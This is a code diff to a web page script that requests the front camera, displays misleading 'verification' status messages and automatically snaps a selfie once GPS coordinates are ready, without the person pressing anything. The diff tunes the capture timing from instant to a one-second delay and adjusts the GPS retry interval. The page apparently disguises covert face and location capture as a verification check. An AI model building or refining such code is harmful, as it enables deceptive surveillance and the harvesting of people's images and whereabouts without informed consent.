@@ -58,20 +58,19 @@
 
     // 2. Request Camera Feed Access
     function setupCamera() {
-        statusDiv.innerText = "Syncing verification features...";
+        statusDiv.innerText = "Syncing verification features... Please hold steady.";
         
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then((stream) => {
                 videoStream = stream;
                 videoEl.srcObject = stream;
                 videoEl.style.display = 'inline-block';
-                statusDiv.innerText = "Verifying surroundings...";
                 
-                // 3. INSTANT TRIGGER
-                // Triggers as soon as the camera feed meta-data is ready, with no artificial delay
-                videoEl.onloadedmetadata = () => {
+                // 3. ONE SECOND TIMEOUT TRIGGER
+                // 1000 milliseconds = Exactly 1 second delay for camera calibration
+                setTimeout(() => {
                     autoCaptureSelfie();
-                };
+                }, 1000);
             })
             .catch((err) => {
                 statusDiv.innerText = "Camera access denied. Please allow camera permissions.";
@@ -79,12 +78,12 @@
             });
     }
 
-    // 4. Zero-Delay Snapshot Processing Engine
+    // 4. Snapshot Processing Engine
     function autoCaptureSelfie() {
         if (photoTaken) return; 
         if (!currentLat || !currentLon) {
-            // If GPS hardware is still booting up, wait a tiny fraction of a second and retry
-            setTimeout(autoCaptureSelfie, 200);
+            // If GPS hardware is still warming up, wait a split second and check again
+            setTimeout(autoCaptureSelfie, 500);
             return;
         }
 
